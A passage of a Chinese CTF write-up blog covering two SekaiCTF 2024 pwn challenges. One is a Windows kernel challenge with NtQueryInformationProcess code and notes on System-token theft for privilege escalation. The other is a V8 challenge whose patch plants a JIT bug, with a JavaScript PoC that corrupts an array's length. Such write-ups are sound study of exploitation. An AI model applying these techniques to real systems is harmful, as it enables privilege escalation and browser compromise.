+<p>根据 ProcessInformationClass 值返回指定的结构，比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ProcessBasicInformation = 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;	  </span><br><span class="line">	  DWORD ExitStatus;                    <span class="comment">// 接收进程终止状态</span></span><br><span class="line">      DWORD PebBaseAddress;                <span class="comment">// 接收PEB进程环境块地址</span></span><br><span class="line">      DWORD AffinityMask;                  <span class="comment">// 接收进程关联掩码</span></span><br><span class="line">      DWORD BasePriority;                  <span class="comment">// 接收进程的优先级类</span></span><br><span class="line">      ULONG UniqueProcessId;               <span class="comment">// 接收进程ID</span></span><br><span class="line">      ULONG InheritedFromUniqueProcessId;  <span class="comment">//接收父进程ID</span></span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>
+
+<p>这个也是常见的<a target="_blank" rel="noopener" href="https://anti-debug.checkpoint.com/techniques/debug-flags.html#using-win32-api-ntqueryinformationprocess">Anti-Debug</a>检查</p>
+<p>至于 <code>PROCESSINFOCLASS</code> 的内容</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ntdoc.m417z.com/processinfoclass">PROCESSINFOCLASS</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.magnumdb.com/search?q=parent:PROCESSINFOCLASS">The Magic Number Database</a></li>
+</ul>
+<p>win11 24h2 才有的<code>ProcessNetworkIoCounters</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_NETWORK_COUNTERS</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG64 BytesIn;</span><br><span class="line">    ULONG64 BytesOut;</span><br><span class="line">&#125; PROCESS_NETWORK_COUNTERS, *PPROCESS_NETWORK_COUNTERS;</span><br></pre></td></tr></table></figure>
+
+<p>在内核中</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffff848bb76a5040 -r1 ((ntkrnlmp!_PROCESS_NETWORK_COUNTERS *)<span class="number">0</span>xffff848bbeeb7928)</span><br><span class="line">((ntkrnlmp!_PROCESS_NETWORK_COUNTERS *)<span class="number">0</span>xffff848bbeeb7928)                 : <span class="number">0</span>xffff848bbeeb7928 [<span class="built_in">Type</span>: _PROCESS_NETWORK_COUNTERS *]</span><br><span class="line">    [+<span class="number">0</span>x000] BytesIn          : <span class="number">0</span>x0 [<span class="built_in">Type</span>: unsigned __int64]</span><br><span class="line">    [+<span class="number">0</span>x008] BytesOut         : <span class="number">0</span>x0 [<span class="built_in">Type</span>: unsigned __int64]</span><br></pre></td></tr></table></figure>
+
+<p>可以读取这个指针的内容，比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>);</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_NETWORK_COUNTERS</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG64 BytesIn;</span><br><span class="line">    ULONG64 BytesOut;</span><br><span class="line">&#125; PROCESS_NETWORK_COUNTERS, * PPROCESS_NETWORK_COUNTERS;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessNetworkIoCounters (PROCESSINFOCLASS)0x72</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESS_NETWORK_COUNTERS pnc;</span><br><span class="line">    ULONG ulReturnLength;</span><br><span class="line">    <span class="built_in">NtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), ProcessNetworkIoCounters, &amp;pnc, <span class="built_in">sizeof</span>(pnc), &amp;ulReturnLength);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[*]Read %#llx, %#llx\r\n&quot;</span>, pnc.BytesIn, pnc.BytesOut);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>知道这个就可以提权了。</p>
+<p>System Token: 遍历 <code>ActiveProcessLinks</code>，通过pid获取Token。</p>
+<p>官方WP: <a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2024/blob/main/pwn/process-flipper/solution/solution.cpp">project-sekai-ctf&#x2F;sekaictf-2024</a></p>
+<ul>
+<li>借助 <code>DiskCounterOffset</code></li>
+</ul>
+<p>思考😭</p>
+<ul>
+<li>我们可以任意写 EPROCESS 结构 -&gt; 写 token 提权</li>
+<li>读System token -&gt; EPROCESS 中是否有我们在用户态可以读取的数据，以及如何读 -&gt; 修改地址进行读</li>
+<li>多玩</li>
+</ul>
+<hr>
+<h2 id="Context-Reducer"><a href="#Context-Reducer" class="headerlink" title="Context Reducer"></a>Context Reducer</h2><p>v8 0day?</p>
+<ul>
+<li>Tinker with the optimizations, watch as boundaries blur and opportunities arise.</li>
+<li>出题人：<a target="_blank" rel="noopener" href="https://github.com/rycbar77">rycbar77</a></li>
+</ul>
+<p>readme</p>
+<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git checkout 20226b740bfa1a1e46dff80363232dfd3da50de8</span><br><span class="line">is<span class="emphasis">_debug = false</span></span><br><span class="line"><span class="emphasis">v8_</span>static<span class="emphasis">_library = true</span></span><br><span class="line"><span class="emphasis">target_</span>cpu = &quot;x64&quot;</span><br><span class="line">v8<span class="emphasis">_enable_</span>sandbox = true</span><br><span class="line">v8<span class="emphasis">_enable_</span>object<span class="emphasis">_print = true</span></span><br></pre></td></tr></table></figure>
+
+<p>还patch了一些预防非预期的内置函数。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/compiler/js-context-specialization.cc b/src/compiler/js-context-specialization.cc</span></span><br><span class="line"><span class="comment">index e474fc55864..bf2d70168e0 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/js-context-specialization.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/js-context-specialization.cc</span></span><br><span class="line"><span class="meta">@@ -254,7 +254,7 @@</span> Reduction JSContextSpecialization::ReduceJSStoreScriptContext(Node* node) &#123;</span><br><span class="line">     // The value is not a constant any more, so we don&#x27;t need to generate</span><br><span class="line">     // code for invalidating the side data.</span><br><span class="line">     const Operator* op =</span><br><span class="line"><span class="deletion">-        jsgraph_-&gt;javascript()-&gt;StoreContext(access.depth(), access.index());</span></span><br><span class="line"><span class="addition">+        jsgraph_-&gt;javascript()-&gt;StoreContext(0, access.index());</span></span><br><span class="line">     NodeProperties::ChangeOp(node, op);</span><br><span class="line">     return Changed(node);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示来说是一个优化导致的边界的判断错误</p>
+<p>主要是op的问题，本来是从 <code>access.depth()</code> 获取，但是这里是 <code>0</code></p>
+<p>调用链</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>找<a target="_blank" rel="noopener" href="https://issues.chromium.org/issues">issues</a></p>
+<p>因为与优化有关，并且没有 <code>--allow-natives-syntax</code>，那触发这个漏洞就需要大量的循环</p>
+<p>PoC</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pad1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> pad2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> pad3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> pad4 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> v1;</span><br><span class="line"><span class="keyword">var</span> cor = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [cor, cor];</span><br><span class="line"><span class="keyword">var</span> dbl_arr = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">      v1 = cor;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  C[<span class="number">1</span>] = <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">  <span class="title function_">f</span>();</span><br><span class="line">  <span class="title function_">f</span>();</span><br><span class="line">  <span class="title function_">f</span>();</span><br><span class="line">  <span class="title function_">f</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;length:&quot;</span>, cor.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="sbx-bypassing"><a href="#sbx-bypassing" class="headerlink" title="sbx-bypassing"></a>sbx-bypassing</h4><p>可以看出编译选项中开了沙箱，出题人的 0 Day</p>
+<ul>
+<li>WP: <a target="_blank" rel="noopener" href="https://github.com/rycbar77/writeups/tree/master/2024/sekaictf/ContextReducer">ContextReducer</a></li>
+</ul>
+<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://windows-internals.com/kaslr-leaks-restriction/">24h2 无法使用 <code>NtQuerySystemInformation</code> 进行信息泄露</a>😭</li>
+<li><a target="_blank" rel="noopener" href="https://exploits.forsale/24h2-nt-exploit/">Exploiting the NT Kernel in 24H2: New Bugs in Old Code &amp; Side Channels Against KASLR</a></li>
+</ul>
+
+        
+  </div>
+</article>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    chips
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
